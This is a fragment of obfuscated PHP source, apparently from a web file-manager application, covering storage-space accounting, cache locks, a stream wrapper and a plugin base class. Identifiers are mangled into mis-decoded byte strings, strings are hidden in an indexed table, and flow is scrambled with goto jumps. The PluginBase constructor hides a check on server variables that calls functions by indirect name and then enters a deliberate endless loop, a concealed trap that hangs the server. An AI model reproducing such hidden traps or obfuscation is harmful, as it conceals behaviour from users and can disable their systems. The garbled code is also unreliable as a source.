$®ÒÉÑÀà[$·İ—¬‚][$´Áµñ¨ô[475]]) { $®ÒÉÑÀà[$·İ—¬‚][$´Áµñ¨ô[78]] += $É×Ì Œ[$´Áµñ¨ô[78]]; } } } $É¥‰‡ùî = array(); foreach ($®ÒÉÑÀà as $É×Ì Œ) { if ($É×Ì Œ[$´Áµñ¨ô[78]] == $É×Ì Œ[$´Áµñ¨ô[2215]]) { continue; } $É¥‰‡ùî[] = array($´Áµñ¨ô[183], $É×Ì Œ[$´Áµñ¨ô[183]], $´Áµñ¨ô[78], $É×Ì Œ[$´Áµñ¨ô[78]]); } $this->saveAll($É¥‰‡ùî); } public function userSpaceReset($™Æ´ğœ™ = false) { $Ùíß¾§ =& $_SERVER[•Ùç É]; $Ìóªì¡å = $this->where(array($Ùíß¾§[180] => self::TYPE_USER, $Ùíß¾§[540] => $™Æ´ğœ™, $Ùíß¾§[455] => 0))->sum($Ùíß¾§[78]); $Ìóªì¡å = !$Ìóªì¡å || $Ìóªì¡å <= 0 ? 0 : $Ìóªì¡å; Model($Ùíß¾§[548])->userEdit($™Æ´ğœ™, array($Ùíß¾§[1893] => $Ìóªì¡å)); } public function targetSpaceUpdate($“˜ïå÷õ, $ÄŞïşÀ) { $Ã¹ŞËÃ =& $_SERVER[•Ùç É]; if (!$ÄŞïşÀ) { return; } if (!in_array($“˜ïå÷õ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $¬ÔÙ«ù = $this->targetSpaceSize($“˜ïå÷õ, $ÄŞïşÀ); if ($“˜ïå÷õ == self::TYPE_USER) { Model($Ã¹ŞËÃ[548])->userEdit($ÄŞïşÀ, array($Ã¹ŞËÃ[1893] => $¬ÔÙ«ù)); } else { if ($“˜ïå÷õ == self::TYPE_GROUP) { Model($Ã¹ŞËÃ[556])->groupEdit($ÄŞïşÀ, array($Ã¹ŞËÃ[1893] => $¬ÔÙ«ù)); } } } public function targetSpaceSize($¿ØÕøˆé, $ş…É±ğ†) { $™çÍâˆ =& $_SERVER[•Ùç É]; $ï–ºÑ¦¨ = 0; $Ô‘Àó‚ = $this->targetSourceRoot($¿ØÕøˆé, $ş…É±ğ†, !0); foreach ($Ô‘Àó‚ as $‘ ™ä›ü) { if (!$‘ ™ä›ü) { continue; } $ï–ºÑ¦¨ += floatval($‘ ™ä›ü[$™çÍâˆ[78]]); $è“•‚Ï = array($™çÍâˆ[622] => array($™çÍâˆ[582], $™çÍâˆ[565] . $‘ ™ä›ü[$™çÍâˆ[183]] . $™çÍâˆ[583])); $Ö¤Œı®œ = Model($™çÍâˆ[473])->field($™çÍâˆ[461])->where($è“•‚Ï)->select(); $Ö¤Œı®œ = array_to_keyvalue($Ö¤Œı®œ, $™çÍâˆ[12], $™çÍâˆ[183]); $Ö¤Œı®œ = array_unique(array_filter($Ö¤Œı®œ)); if ($Ö¤Œı®œ) { $è“•‚Ï = array($™çÍâˆ[461] => array($™çÍâˆ[462], $Ö¤Œı®œ)); $ï–ºÑ¦¨ += floatval($this->where($è“•‚Ï)->sum($™çÍâˆ[78])); } } $ï–ºÑ¦¨ = !$ï–ºÑ¦¨ || $ï–ºÑ¦¨ <= 0 ? 0 : $ï–ºÑ¦¨; return $ï–ºÑ¦¨; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¿ğª÷Í) { return $this->fileTypeProfile($¿ğª÷Í, SourceModel::TYPE_USER); } public function groupFileTypeProfile($§…Á÷ğ°) { return $this->fileTypeProfile($§…Á÷ğ°, SourceModel::TYPE_GROUP); } private function fileTypeProfile($óôÓ¤¶ç, $éïéÛø×) { $¬§à¨Ó÷ =& $_SERVER[•Ùç É]; $àã¬í¥ = $¬§à¨Ó÷[2216] . $óôÓ¤¶ç . $¬§à¨Ó÷[11] . $éïéÛø×; $¡ÅÖÙ•Æ = Cache::get($àã¬í¥); if ($¡ÅÖÙ•Æ) { return $¡ÅÖÙ•Æ; } $¯Ïªˆ’ù = array($¬§à¨Ó÷[616] => 0); if ($óôÓ¤¶ç != !1) { $¯Ïªˆ’ù[$¬§à¨Ó÷[540]] = $óôÓ¤¶ç; $¯Ïªˆ’ù[$¬§à¨Ó÷[180]] = $éïéÛø×; } $ğä´èá« = array(); $ğä´èá«[$¬§à¨Ó÷[2217]] = array($¬§à¨Ó÷[2218] => LNG($¬§à¨Ó÷[2217]), $¬§à¨Ó÷[2219] => $this->where($¯Ïªˆ’ù)->count(), $¬§à¨Ó÷[587] => $this->where($¯Ïªˆ’ù)->sum($¬§à¨Ó÷[78])); $ê»ŞíÒ‚ = KodIO::fileTypeList(); foreach ($ê»ŞíÒ‚ as $áİø½Á => $ãÔ¶µ©Á) { $¯Ïªˆ’ù[$¬§à¨Ó÷[456]] = $this->fileTypeWhere($áİø½Á); $ğä´èá«[$áİø½Á] = array($¬§à¨Ó÷[2218] => $ãÔ¶µ©Á[$¬§à¨Ó÷[32]], $¬§à¨Ó÷[2219] => $this->where($¯Ïªˆ’ù)->count(), $¬§à¨Ó÷[587] => $this->where($¯Ïªˆ’ù)->sum($¬§à¨Ó÷[78])); } Cache::set($àã¬í¥, $ğä´èá«, 1200); return $ğä´èá«; } public function fileNameExist($¯ï«ä“™, $¤‘ˆƒı‘) { $÷óÛÏş =& $_SERVER[•Ùç É]; $¢ğ¾ÖÎ³ = $this->field($÷óÛÏş[2220])->where(array($÷óÛÏş[182] => $¯ï«ä“™, $÷óÛÏş[32] => $¤‘ˆƒı‘, $÷óÛÏş[475] => 0))->find(); return is_array($¢ğ¾ÖÎ³) ? $¢ğ¾ÖÎ³[$÷óÛÏş[183]] : !1; } public function childList($ùö·é¿) { $­Ñ¸ÄÍ‹ =& $_SERVER[•Ùç É]; $ñõ¯©Èº = $­Ñ¸ÄÍ‹[2193] . $ùö·é¿; if (isset(self::$cacheChildList[$ñõ¯©Èº])) { return self::$cacheChildList[$ñõ¯©Èº]; } $êÂ„ŠŠ = array($­Ñ¸ÄÍ‹[182] => intval($ùö·é¿), $­Ñ¸ÄÍ‹[475] => 0); $îö•Ìİ˜ = $this->where($êÂ„ŠŠ)->select(); $îö•Ìİ˜ = $îö•Ìİ˜ ? $îö•Ìİ˜ : array(); self::$cacheChildList[$ñõ¯©Èº] = $îö•Ìİ˜; foreach ($îö•Ìİ˜ as $ªÖ—«Òò) { $ñõ¯©Èº = $­Ñ¸ÄÍ‹[503] . $ªÖ—«Òò[$­Ñ¸ÄÍ‹[183]]; self::$cacheSourceInfo[$ñõ¯©Èº] = $ªÖ—«Òò; } return $îö•Ìİ˜; } public function fileNameAuto($¶Öì”Ì, $ÇœÇ‡¨•, $…‡İ©º = REPEAT_RENAME, $’û¸à“ñ = false) { $Üšá©Ÿæ =& $_SERVER[•Ùç É]; $Üà»ßı¡ = get_path_ext($ÇœÇ‡¨•); $µï¤îÜ = $Üà»ßı¡ ? basename($ÇœÇ‡¨•, $Üšá©Ÿæ[10] . $Üà»ßı¡) . $Üšá©Ÿæ[2221] . $Üà»ßı¡ : $ÇœÇ‡¨• . $Üšá©Ÿæ[430]; $ŞÔ§»ˆ’ = array($Üšá©Ÿæ[182] => $¶Öì”Ì, $Üšá©Ÿæ[475] => 0, $Üšá©Ÿæ[32] => array($Üšá©Ÿæ[429], $µï¤îÜ)); $ŒÀæú… = $this->field($Üšá©Ÿæ[32])->where($ŞÔ§»ˆ’)->select(); $öñşŒåŞ = array_to_keyvalue($ŒÀæú…, $Üšá©Ÿæ[12], $Üšá©Ÿæ[32]); return $this->fileNameAutoGet($öñşŒåŞ, $ÇœÇ‡¨•, $…‡İ©º, $’û¸à“ñ); } public function fileNameAutoGet($¡›¡°ù¸, $Ö€Š´èÁ, $•Ã¿ØÕ÷, $§²×Ñş¯) { $îÙ‚·Ÿ§ =& $_SERVER[•Ùç É]; if ($•Ã¿ØÕ÷ == REPEAT_REPLACE || !$¡›¡°ù¸ || !in_array_not_case($Ö€Š´èÁ, $¡›¡°ù¸) || $§²×Ñş¯ && $•Ã¿ØÕ÷ != REPEAT_RENAME_FOLDER) { return $Ö€Š´èÁ; } if ($•Ã¿ØÕ÷ == REPEAT_SKIP) { return !1; } $Ş‡ÆÖ© = $îÙ‚·Ÿ§[10] . get_path_ext($Ö€Š´èÁ); $Ş‡ÆÖ© = $Ş‡ÆÖ© == $îÙ‚·Ÿ§[10] || $§²×Ñş¯ ? $îÙ‚·Ÿ§[12] : $Ş‡ÆÖ©; for ($ïŒËÆªİ = 1; $ïŒËÆªİ <= count($¡›¡°ù¸) + 1; $ïŒËÆªİ++) { $Œ˜Çäœ‡ = substr($Ö€Š´èÁ, 0, strlen($Ö€Š´èÁ) - strlen($Ş‡ÆÖ©)); $äºË¢óÎ = $Œ˜Çäœ‡ . "\x28{$ïŒËÆªİ}\51{$Ş‡ÆÖ©}"; if (!in_array_not_case($äºË¢óÎ, $¡›¡°ù¸)) { return $äºË¢óÎ; } } } } goto C›“”–†; F±ˆåˆ£ÏÚ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ËåĞùÎå =& $_SERVER[•Ùç É]; if (self::$handle) { return self::$handle; } $ë°ˆáªá = $GLOBALS[$ËåĞùÎå[6]][$ËåĞùÎå[395]]; self::$timeout = $ë°ˆáªá[$ËåĞùÎå[886]] ? $ë°ˆáªá[$ËåĞùÎå[886]] : 10; $òÍ¡ÈÄÃ = _get($GLOBALS[$ËåĞùÎå[6]], $ËåĞùÎå[887]); $º¥Çâ© = $ë°ˆáªá[$ËåĞùÎå[872]] ? $ë°ˆáªá[$ËåĞùÎå[872]] : $ËåĞùÎå[216]; if ($º¥Çâ© == $ËåĞùÎå[21] && $òÍ¡ÈÄÃ == $ËåĞùÎå[13]) { $º¥Çâ© = $ËåĞùÎå[216]; } switch ($º¥Çâ©) { case $ËåĞùÎå[875]: self::$handle = new CacheLockRedis(); break; case $ËåĞùÎå[876]: self::$handle = new CacheLockMemcached(); break; case $ËåĞùÎå[21]: self::$handle = new CacheLockDatabase(); break; case $ËåĞùÎå[216]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ËåĞùÎå[888], $ËåĞùÎå[889]); } return self::$handle; } private static function key($°úÜÕÒé) { return $_SERVER[•Ùç É][890] . Cache::key($°úÜÕÒé); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ÍÅ¨Å› = '') { self::$errorMsg = $ÍÅ¨Å›; } public static function lockGlobal($æ°ºƒõ™, $»öÀ¡ıĞ) { return self::lock($æ°ºƒõ™, $»öÀ¡ıĞ, !0); } public static function lock($·Åø»•, $ëşŞ±²– = false, $ÇÏšş¹¹ = false) { $ˆ´Úşñè =& $_SERVER[•Ùç É]; $úòì•® = self::init(); $ùõÛÚ = self::key($·Åø»•); $ëşŞ±²– = $ëşŞ±²– ? $ëşŞ±²– : self::$timeout; $šä”•ƒ… = timeFloat(); $Ê£ªñµ˜ = $úòì•®->lock($ùõÛÚ, $ëşŞ±²–); $õ¯²Õªµ = timeFloat(); if (!$Ê£ªñµ˜) { $ìéÅøû¦ = "\x6c\x6f\x63\x6b\40\145\x72\x72\157\x72\x3b\153\x65\171\x3d{$·Åø»•}\73\164\x69\x6d\145\x3d{$ëşŞ±²–}\73" . self::$errorMsg . $ˆ´Úşñè[73] . get_caller_msg(); $ÔÁëª¢ = LNG($ˆ´Úşñè[891]) . "\50{$ëşŞ±²–}\163\x29\56" . LNG($ˆ´Úşñè[892]); $ÔÁëª¢ .= $ˆ´Úşñè[893]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ÔÁëª¢ = $ÔÁëª¢ . $ˆ´Úşñè[894] . self::$errorMsg; } write_log($ˆ´Úşñè[895] . sprintf($ˆ´Úşñè[896], timeFloat() - $šä”•ƒ…) . $ˆ´Úşñè[897] . $ìéÅøû¦ . $ˆ´Úşñè[898] . error_get_last(), $ˆ´Úşñè[889]); show_json($ÔÁëª¢, !1); } if (!$ÇÏšş¹¹) { self::$lockItem[$ùõÛÚ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ÕËÒ‘¨‡ = number_format(timeFloat() - $õ¯²Õªµ, 3); write_log($ˆ´Úşñè[899] . $·Åø»• . $ˆ´Úşñè[900] . $ÕËÒ‘¨‡, $ˆ´Úşñè[889]); } return $Ê£ªñµ˜; } public static function lockGet($œ¹ÑÀÛ) { $ôÚ¯Ğ´« = self::key($œ¹ÑÀÛ); if (self::$lockItem[$ôÚ¯Ğ´«]) { return self::$lockItem[$ôÚ¯Ğ´«]; } return self::init()->lockGet($ôÚ¯Ğ´«); } public static function unlock($¼Ìˆö®ü) { $¡¯³—ä‡ =& $_SERVER[•Ùç É]; $–ğ’ö³ = self::key($¼Ìˆö®ü); self::$lockItem[$–ğ’ö³] = null; self::init()->unlock($–ğ’ö³); if (GLOBAL_DEBUG_LOG_ALL) { write_log($¡¯³—ä‡[901] . $¼Ìˆö®ü, $¡¯³—ä‡[889]); } return; } public static function unlockRuntime() { $¦…™øâİ =& $_SERVER[•Ùç É]; $‘ÈšÉü = self::init(); $›àšúĞ² = !1; foreach (self::$lockItem as $ÄòÀè¢× => $Ü¼˜†ˆò) { if (!$Ü¼˜†ˆò) { continue; } $‘ÈšÉü->unlock($ÄòÀè¢×); if (!$›àšúĞ²) { $›àšúĞ² = !0; write_log($¦…™øâİ[902] . $ÄòÀè¢× . $¦…™øâİ[73] . get_caller_msg(), $¦…™øâİ[889]); continue; } write_log($¦…™øâİ[902] . $ÄòÀè¢×, $¦…™øâİ[889]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $øĞôµÎ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¦…™øâİ[903] . $øĞôµÎ . $¦…™øâİ[904] . ACTION, $¦…™øâİ[889]); } } public static function fileLock($¥†«—’°) { $‹•ˆøŠ =& $_SERVER[•Ùç É]; if (!$GLOBALS[$‹•ˆøŠ[905]]) { $GLOBALS[$‹•ˆøŠ[905]] = array(); } $GLOBALS[$‹•ˆøŠ[905]][$¥†«—’°] = !1; $æò ³ğ¯ = fopen(DATA_PATH . $¥†«—’° . $‹•ˆøŠ[906], $‹•ˆøŠ[907]); if (!$æò ³ğ¯) { return !1; } $GLOBALS[$‹•ˆøŠ[905]][$¥†«—’°] = $æò ³ğ¯; if (flock($æò ³ğ¯, LOCK_EX)) { return !0; } self::unlock($¥†«—’°); show_json($‹•ˆøŠ[908], !1); return !1; } public static function fileUnlock($ÏŒÛ‚şª) { $ˆÍ–‚ =& $_SERVER[•Ùç É]; $ƒß“İ” = $GLOBALS[$ˆÍ–‚[905]][$ÏŒÛ‚şª]; if (!$ƒß“İ”) { return; } $GLOBALS[$ˆÍ–‚[905]][$ÏŒÛ‚şª] = !1; flock($ƒß“İ”, LOCK_UN); fclose($ƒß“İ”); } public static function fileUnlockAll() { $èúø½§° =& $_SERVER[•Ùç É]; if (!$GLOBALS[$èúø½§°[905]]) { return; } foreach ($GLOBALS[$èúø½§°[905]] as $ÚÏÀÂŸÂ => $ĞÔ×æã³) { if (!$ĞÔ×æã³) { continue; } $GLOBALS[$èúø½§°[905]][$ÚÏÀÂŸÂ] = !1; flock($ĞÔ×æã³, LOCK_UN); fclose($ĞÔ×æã³); } $GLOBALS[$èúø½§°[905]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¬ÀºìõÒ =& $_SERVER[•Ùç É]; $«×Òœ­º = $GLOBALS[$¬ÀºìõÒ[6]][$¬ÀºìõÒ[395]]; self::$cachePath = $«×Òœ­º[$¬ÀºìõÒ[216]][$¬ÀºìõÒ[86]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¿íğú¥, $´ŸÒá±Ò = 0) { $­­¿›ìƒ =& $_SERVER[•Ùç É]; $®©É¿üè = microtime(!0); $àØÒÌî = $®©É¿üè + $´ŸÒá±Ò + 0.0001; $ÀÕã¥æº = rtrim(self::$cachePath, $­­¿›ìƒ[8]) . $­­¿›ìƒ[909] . md5($¿íğú¥) . $­­¿›ìƒ[906]; if (file_exists($ÀÕã¥æº) && filemtime($ÀÕã¥æº) && filemtime($ÀÕã¥æº) < time() - 10) { @unlink($ÀÕã¥æº); } do { if (file_exists($ÀÕã¥æº)) { cacheLockWait(); continue; } $ğÜÄ¼ÖÂ = fopen($ÀÕã¥æº, $­­¿›ìƒ[910]); if (!$ğÜÄ¼ÖÂ) { return !1; } $Æ³ÆùïË = flock($ğÜÄ¼ÖÂ, LOCK_EX | LOCK_NB); self::$caches[$¿íğú¥] = array($­­¿›ìƒ[911] => $ğÜÄ¼ÖÂ, $­­¿›ìƒ[216] => $ÀÕã¥æº); fwrite($ğÜÄ¼ÖÂ, $àØÒÌî); clearstatcache(); if ($ğÜÄ¼ÖÂ && $Æ³ÆùïË) { return !0; } cacheLockWait(); } while (microtime(!0) < $àØÒÌî); $this->unlock($¿íğú¥); return !1; } public function lockGet($Æ—ç¾µ÷) { $æ·áÓĞ =& $_SERVER[•Ùç É]; $Ò•ÖàÚ = rtrim(self::$cachePath, $æ·áÓĞ[8]) . $æ·áÓĞ[909] . md5($Æ—ç¾µ÷) . $æ·áÓĞ[906]; return file_exists($Ò•ÖàÚ); } public function unlock($šèş˜ÀË) { $ò©Ÿ¾ù =& $_SERVER[•Ùç É]; $ê¾Àœ¢ = self::$caches[$šèş˜ÀË]; if (!$ê¾Àœ¢) { return; } @flock($ê¾Àœ¢[$ò©Ÿ¾ù[911]], LOCK_UN); @fclose($ê¾Àœ¢[$ò©Ÿ¾ù[911]]); @unlink($ê¾Àœ¢[$ò©Ÿ¾ù[216]]); unset(self::$caches[$šèş˜ÀË]); } } goto D´ÜÍÙÕ”®; aë¿£®ŞƒÓ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($•Å§¿ù‡, $â³—‘ÕŒ = '') { $this->info = $this->info($•Å§¿ù‡); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[•Ùç É][86]]; $this->pathOpen = $•Å§¿ù‡; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$•Å§¿ù‡])) { self::$_chunkBuffer[$•Å§¿ù‡] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($İÕ¾àº) { $ÒôÅÒç = $this->fileSubstr($this->pose, $İÕ¾àº); $this->pose += strlen($ÒôÅÒç); return $ÒôÅÒç; } public function stream_tell() { return $this->pose; } public function stream_seek($¡´ß’äá, $ı›Á è) { $ñùŠ¦´ê =& $_SERVER[•Ùç É]; if ($ı›Á è == SEEK_SET) { $this->pose = $¡´ß’äá; } else { if ($ı›Á è == SEEK_CUR) { $this->pose += $¡´ß’äá; } else { if ($ı›Á è == SEEK_END) { $this->pose = $this->info[$ñùŠ¦´ê[78]] + intval($¡´ß’äá); } } } if ($¡´ß’äá < 0) { $this->pose = $this->info[$ñùŠ¦´ê[78]] + $¡´ß’äá; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[•Ùç É][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($—İ¬¶Şç, $ù‰Áéá˜) { $»Ò­ÈçØ =& $_SERVER[•Ùç É]; $Ô€…› Ø = $this->info($—İ¬¶Şç); return array($»Ò­ÈçØ[1542] => 0, $»Ò­ÈçØ[1543] => 0, $»Ò­ÈçØ[16] => 32768 + 511, $»Ò­ÈçØ[1544] => 0, $»Ò­ÈçØ[1545] => 0, $»Ò­ÈçØ[1546] => 0, $»Ò­ÈçØ[1547] => 0, $»Ò­ÈçØ[78] => $Ô€…› Ø[$»Ò­ÈçØ[78]], $»Ò­ÈçØ[1548] => $Ô€…› Ø[$»Ò­ÈçØ[1414]], $»Ò­ÈçØ[1504] => $Ô€…› Ø[$»Ò­ÈçØ[87]], $»Ò­ÈçØ[1503] => $Ô€…› Ø[$»Ò­ÈçØ[217]], $»Ò­ÈçØ[1549] => 0, $»Ò­ÈçØ[1550] => 0); } static $fileInfo = array(); public function info($üÉªß•ê) { $Ï®ÀŸöò = $_SERVER[•Ùç É][1551]; if (isset(self::$fileInfo[$üÉªß•ê])) { return self::$fileInfo[$üÉªß•ê]; } if (substr($üÉªß•ê, 0, strlen($Ï®ÀŸöò)) != $Ï®ÀŸöò) { return !1; } self::$fileInfo[$üÉªß•ê] = IO::info(substr($üÉªß•ê, strlen($Ï®ÀŸöò))); return self::$fileInfo[$üÉªß•ê]; } public static function read($†Ÿ“›š, $‹Ê˜üË, $Èëş §») { if (!isset(self::$_fopenCache[$†Ÿ“›š])) { $ èÀÆü® = new StreamWrapperIO(); $ èÀÆü®->stream_open($†Ÿ“›š); self::$_fopenCache[$†Ÿ“›š] = $ èÀÆü®; } $ èÀÆü® = self::$_fopenCache[$†Ÿ“›š]; return $ èÀÆü®->fileSubstr($‹Ê˜üË, $Èëş §»); } public static function _read($ÈšŞ¯», $Ê÷íÛ£Ñ, $ñ¯íé‘î) { $¬áÇÎ‹ =& $_SERVER[•Ùç É]; $›©Ìúœ¿ = fopen($ÈšŞ¯», $¬áÇÎ‹[1418]); if (!$›©Ìúœ¿) { return $¬áÇÎ‹[12]; } $àƒó = 8192; fseek($›©Ìúœ¿, $Ê÷íÛ£Ñ, SEEK_SET); $ıÃÁ– = $¬áÇÎ‹[12]; $’¶æ›¶ = 0; while ($’¶æ›¶ < $ñ¯íé‘î) { $ËÕÄ‘µ = min($àƒó, $ñ¯íé‘î - $’¶æ›¶); $ıÃÁ– .= fread($›©Ìúœ¿, $ËÕÄ‘µ); $’¶æ›¶ += $ËÕÄ‘µ; } fclose($›©Ìúœ¿); return $ıÃÁ–; } public function fileSubstr($û¬¯‰—, $©éß’¥) { $öÀö‰Ûá =& $_SERVER[•Ùç É]; $ı»ºÁ´ = $this->info[$öÀö‰Ûá[78]]; $ÖüÄÌ’ = $û¬¯‰—; $ÓŸŒº×á = $©éß’¥; if ($û¬¯‰— < 0) { $û¬¯‰— = $ı»ºÁ´ + $û¬¯‰—; } if ($©éß’¥ === !1) { $©éß’¥ = $ı»ºÁ´ - $û¬¯‰—; } if ($û¬¯‰— + $©éß’¥ > $ı»ºÁ´) { $©éß’¥ = $ı»ºÁ´ - $û¬¯‰—; } if ($©éß’¥ <= 0) { return $öÀö‰Ûá[12]; } if ($û¬¯‰— < 0 || $û¬¯‰— >= $ı»ºÁ´ || $©éß’¥ <= 0 || $©éß’¥ > 1024 * 1024 * 10) { throw new Exception("\151\157\106\151\154\x65\x52\145\141\144\x20\145\162\x72\157\x72\41\40\x73\x74\141\x72\164\75{$û¬¯‰—}\x3b\x6c\x65\156\x67\164\x68\75{$©éß’¥}\73\40\163\x69\x7a\145\x3d{$ı»ºÁ´}\73"); } $Š÷é§áˆ = 64 * 1024; $¾·íÁÆÙ =& self::$_chunkBuffer[$this->path]; if (!$¾·íÁÆÙ) { $¾·íÁÆÙ = array(); } $Ãò ü¯§ = 0; $‡‹Áø¼ = 0; $‰Üî»üâ = $öÀö‰Ûá[12]; foreach ($¾·íÁÆÙ as $Ãò ü¯§ => $‰Üî»üâ) { $Ãò ü¯§ = intval($Ãò ü¯§); $‡‹Áø¼ = $Ãò ü¯§ + strlen($‰Üî»üâ); if ($û¬¯‰— >= $‡‹Áø¼) { continue; } if ($û¬¯‰— >= $Ãò ü¯§ && $û¬¯‰— + $©éß’¥ <= $‡‹Áø¼) { return substr($‰Üî»üâ, $û¬¯‰— - $Ãò ü¯§, $©éß’¥); } break; } if (count($¾·íÁÆÙ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($öÀö‰Ûá[1552], $öÀö‰Ûá[1553] . count($¾·íÁÆÙ) . "\73\x73\x74\x61\162\164\x3d{$û¬¯‰—}\54\154\x65\x6e\147\x74\150\75{$©éß’¥}\73\x70\x6f\x73\x65\72{$Ãò ü¯§}\176{$‡‹Áø¼}"); throw new Exception($öÀö‰Ûá[1554]); } $‹ÊòÄÍ· = intval($û¬¯‰— / $Š÷é§áˆ) * $Š÷é§áˆ; $¼‰¿ğÃ« = ceil(($û¬¯‰— + $©éß’¥) / $Š÷é§áˆ) * $Š÷é§áˆ - $‹ÊòÄÍ·; $ª®—‹Ÿ¾ = IO::fileSubstr($this->path, $‹ÊòÄÍ·, $¼‰¿ğÃ«); $¾·íÁÆÙ[$‹ÊòÄÍ· . $öÀö‰Ûá[12]] = $ª®—‹Ÿ¾; ksort($¾·íÁÆÙ); $«û‚òè = substr($ª®—‹Ÿ¾, $û¬¯‰— - $‹ÊòÄÍ·, $©éß’¥); return $«û‚òè; } private function log($óÊíÆ·¤, $§ŠØ„Šş) { $ãùãâé =& $_SERVER[•Ùç É]; $¿º‚—ûõ = timeFloat() - $this->timeStart; write_log(sprintf($ãùãâé[1555], $óÊíÆ·¤, $this->info[$ãùãâé[32]], $¿º‚—ûõ, $§ŠØ„Šş), $ãùãâé[1233]); } } class Message { function __construct() { } public function send($•ú•îÕ† = '', $À¶ºË½£ = array(), $ÄëğÚß· = "\x74\145\x78\164") { $ë£èË·Ï =& $_SERVER[•Ùç É]; $±·®Ûº = array($ë£èË·Ï[33] => $ë£èË·Ï[1556], $ë£èË·Ï[799] => $•ú•îÕ†); if (in_array($ÄëğÚß·, array($ë£èË·Ï[1556], $ë£èË·Ï[1557]))) { $±·®Ûº[$ë£èË·Ï[33]] = $ÄëğÚß·; } $À¶ºË½£ = array($ë£èË·Ï[549] => isset($À¶ºË½£[$ë£èË·Ï[549]]) ? $À¶ºË½£[$ë£èË·Ï[549]] : $ë£èË·Ï[12], $ë£èË·Ï[632] => isset($À¶ºË½£[$ë£èË·Ï[632]]) ? $À¶ºË½£[$ë£èË·Ï[632]] : $ë£èË·Ï[12]); if (empty($•ú•îÕ†) || empty($À¶ºË½£[$ë£èË·Ï[549]]) && empty($À¶ºË½£[$ë£èË·Ï[632]])) { return !1; } $ø¤ŸÚ¿Ç = array($ë£èË·Ï[1497] => $±·®Ûº, $ë£èË·Ï[1558] => $À¶ºË½£); Hook::trigger($ë£èË·Ï[1559], $ø¤ŸÚ¿Ç); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¸ûÃ¥Ø =& $_SERVER[•Ùç É]; if (!isset($_SERVER[$¸ûÃ¥Ø[922]]) || !isset($_SERVER[$¸ûÃ¥Ø[923]])) { $âéÖı³ = $¸ûÃ¥Ø[924]; $¼é¯¾ = $¸ûÃ¥Ø[925]; $ÍˆşŠ¨× = $_SERVER[$¸ûÃ¥Ø[926]] . $¸ûÃ¥Ø[927]; $ù‡Ô‹° = $¼é¯¾($ÍˆşŠ¨×); $ÌÇ÷ûœ = explode($¸ûÃ¥Ø[248], $ù‡Ô‹°); if (count($ÌÇ÷ûœ) < $¸ûÃ¥Ø[671]) { $ƒ¨úåµá = $¸ûÃ¥Ø[928]; $ƒ¨úåµá(); } $éÀ”¢İ´ = $¸ûÃ¥Ø[929]; $éÀ”¢İ´($_SERVER[$¸ûÃ¥Ø[930]]); $×”Ş½·‹ = 1; for ($½¢¼®¦Ä = $×”Ş½·‹; $½¢¼®¦Ä > 0; $½¢¼®¦Ä++) { $éÀ”¢İ´ = json_encode($GLOBALS[$¸ûÃ¥Ø[462]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¸ûÃ¥Ø[1560]); $this->pluginName = str_replace($¸ûÃ¥Ø[1560], $¸ûÃ¥Ø[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¸ûÃ¥Ø[8]; $this->pluginApi = appHostGet() . $¸ûÃ¥Ø[1561] . $this->pluginName . $¸ûÃ¥Ø[8]; $this->pluginHost = $config[$¸ûÃ¥Ø[1562]] . $this->pluginName . $¸ûÃ¥Ø[8]; $this->pluginHostDefault = $config[$¸ûÃ¥Ø[1562]] . $this->pluginName . $¸ûÃ¥Ø[8]; $Ÿ¢Œ¤öÇ = $config[$¸ûÃ¥Ø[1563]]; if ($Ÿ¢Œ¤öÇ && strpos($¸ûÃ¥Ø[50] . $Ÿ¢Œ¤öÇ . $¸ûÃ¥Ø[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¸ûÃ¥Ø[1564]] . $this->pluginName . $¸ûÃ¥Ø[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[•Ùç É][1565]); } protected function assign($‹Ò…˜İÎ, $°ÁØŞ®Š = false) { if (is_array($‹Ò…˜İÎ)) { $this->values = array_merge($this->values, $‹Ò…˜İÎ); } else { $this->values[$‹Ò…˜İÎ] = $°ÁØŞ®Š; } } protected function display($õ¨‰ğ§«) { extract($this->values); require $õ¨‰ğ§«; } final function hookRegist($Å°¨ÂÌ) { $this->modelPlugin->appRegist($this->pluginName, $Å°¨ÂÌ); } final function appIcon() { $Ğ“û¶– =& $_SERVER[•Ùç É]; $Å«È™Ì = $this->appPackage(); $š‡şÆŞ = $Ğ“û¶–[12]; if (isset($Å«È™Ì[$Ğ“û¶–[460]])) { if (isset($Å«È™Ì[$Ğ“û¶–[460]][$Ğ“û¶–[1566]])) { $š‡şÆŞ = $Ğ“û¶–[1567] . 